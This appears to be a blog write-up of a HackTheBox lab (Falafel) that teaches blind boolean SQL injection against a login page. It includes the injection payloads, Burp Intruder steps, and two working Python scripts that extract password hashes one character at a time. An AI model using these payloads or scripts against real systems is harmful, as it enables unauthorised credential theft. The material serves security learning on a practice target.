---
title: SQL Injection 0x03 - Blind Boolean Attacks
date: 2020-07-18 14:37:47
tags: [sqli, sql injeciton, web attacks]
---


# SQL Injection 0x03 - Blind Boolean Attacks

## Introduction


## Identification

After going through application, `/login.php` was the only endpoint with which a user can interact, and with a database that too.

Sending `admin : admin`

![Wrong Identification](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png)

Looks like we can do user enumeration.

## Testing
We'll start with testing now.

Testing with a single-quote first. Sending `admin':admin`

![Try Again](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login2.png)

*Try again..* error.

Let's test a single-quote and a comment. We'll comment out after the single-quote and see if that changes anything.

![Wrong Identification](/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png)

We get *Wrong identification : admin* error again. With this we can say that we have an sql injection on our hand.

## Exploitation

Next step would be get the number of columns, but UNION is blocked regardless of what you do or try any kind of bypass. We could use ORDER BY to get the number of columns but clearly this is not an error-based SQL injection. Since we cannot use UNION, getting the number of columns does not make sense.

Although we cannot dump credentials out on the screen, it does not mean we cannot extract data out.

Since this is a SQL database, we could use *substring* - `substring(string, position, length)` function. As the name suggests, substring function takes a "string" and along with position and length, and prints out the characters of a string from the position and length you specify.

Let's test it with the username field to get a gist, since we know that "admin" exist

!["Right" Error](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub1.png)

It's important to keep in mind that when our SQL injection is working, we get the error "Wrong identification", and when it does not, we get an error "Try again".

Similarly, we can extract passwords of the corresponding usernames: admin and chris

We'll test for [a-f0-9] (because hashes) for each character position for the password string, and if we get the error "Wrong identification", then that would indicate that for that position the password has that character in it's place.

This can be done in BurpSuite Intruder, even in Community Edition which is what I use, let's take a look at finding the first character of the admin's password.

First we select a login request in BurpSuite and "Send it to intruder" and set our payload position:

![Setting Payload Position](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp1.png)

Next step to set a payload, we'll select Brute Forcer. Modify the character set, as below:

![Setting Payload](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp2.png)

To make our life easier, we could put the "right" error string in the "Grep Match" section so that the request that matches as per our error will get marked.

![Grepping Error](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp3.png)

We're now ready to "Start Attack"ing. Once we do, we soon find that the first character of the admins' hash is zero (0). We can now pause the attack since we already got what we needed from this injection.

![Getting The First Character](/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp4.png)


We were successfully able to leverage BurpSuite Intruder to extract the credentials. We can see that the first character of the admin users' password is "0" (Zero).

Although this is nice and we can perform a little more tweaking and get the entire hash, it would be a LOT faster if we whipped up a script of our own and got this done, which is what we will be doing now.

I wrote a script in python to get the admin's hash.

``` python
# Importing necessary library
import requests

# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function
def SQLpayload(i,c):
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


# All the characters in a hash
characters = 'abcdef0123456789'

password = '' # Blank password string

# Loop through every index position : 1 to 32
for i in range(1,33):
# Loop through every character in the "characters" for each index position
    for c in characters:
    # Defining a payload to be sent to the server
        payload = {'username':SQLpayload(i,c), 'password':'n00bsec'}
        # Sending a post request with the above payload and it's data and response is saved in "r"
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        # Checking if "right" error is hit at an index for a character
        if "Wrong identification" in r.text:
        # If right error is hit, add the character to the password string
            password += c
            # Print the character on the screen without adding a "\n" - newline
            print(c,end='',flush=True)
            # No need to cycle through the rest of the characters if the "right" error is already hit for an index position
            break

# Print the hash
print('\nHash is:\t'+password+'\n')
```

Once we run the script we get the admin users' hash.

![Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto1.png)

Although this script works, it takes quite some time to run. So I created another script which would perform some extra queries to the database before it checks whether a character is in users' hashs' X position or not.

The first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it's a hash, it'll always belong to a-f group which is "alpha1" in the below code.
If it's not an alphabet, it's checked if the number belongs to [0-4] group or [5-9].
Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.

These checks are done using "ord". Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it's greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.

``` python
import requests


def SQLstring(i,c):
    # We only want 1 password character at a time
    # Final payload will look like (example 1st chars)
    # username:admin' AND substring(password,1,1)='a'
    return "admin' AND substring(password,%s,1)='%s'-- -" % (i,c)


def SQLsplit(i):
    # Checking if the character is an alphabet
    sql = "admin' AND ord(substring(password,%s,1)) > '58'-- -" % i
    payload = {'username':sql, 'password':'abcd'}
    r = requests.post('http://10.10.10.73/login.php', data=payload)
    if "Wrong identification" in r.text:
    # Checking if it's beyond "f"
        sql = "admin' AND ord(substring(password,%s,1)) > '102'-- -" % i
        payload = {'username':sql, 'password':'abcd'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "alpha2"
        else:
        # If not beyond "f"
            return "alpha1"
    # Character is a number
    else:
    # Checking if number is less than "5"
        sql = "admin' AND ord(substring(password,%s,1)) < '53'-- -" % i
        payload = {'username':sql, 'password':'abcd'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            return "num1"
        else:
        # If number is greater than 5
            return "num2"


# password could be in hashed format or plaintext
alpha1 = 'abcdef'
alpha2 = 'ghijklmnopqrstuvwxyz'
num1 = '01234'
num2 = '56789'

# Password variable
passwd = ''

for i in range(1,33):
    if SQLsplit(i) == "alpha1":
        for a in alpha1:
            payload = {'username':SQLstring(i,a), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break

    elif SQLsplit(i) == "alpha2":
        for a in alpha2:
            payload = {'username':SQLstring(i,a), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += a
                print(a,end='',flush=True)
                break
            
    elif SQLsplit(i) == "num1":
        for n in num1:
            payload = {'username':SQLstring(i,n), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php', data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break

    
    else:
        for n in num2:
            payload = {'username':SQLstring(i,n), 'password':'abcd'}
            r = requests.post('http://10.10.10.73/login.php',data=payload)
            if "Wrong identification" in r.text:
                passwd += n
                print(n,end='',flush=True)
                break


# print('\n')
print('\nPass or Hash is:\t'+passwd+'\n')
```

Running this script and getting admins' hash:

![Admins' Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto2.png)

By making a script with extra checks, it helped us save 38 seconds for just one account, if there were a lot of accounts in here that would add up to some considerable amount of time saved.

Made necessary changes and then fetched chris' hash:

![Chris' Hash Extracted](/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto3.png)

For the second user we were only able to save a meagre 2 seconds, but it's still something right? ¯\\\_(ツ)_/¯

You might wonder if making such a large script compared to the earlier one is worth it, especially for a CTF. The answer is mostly no since the first works just fine. Making a more finer and dynamic script would improve your scripting skills, which is a very important skill to have in the industry and so developing scripts is encouraged.


## Summary


## Fin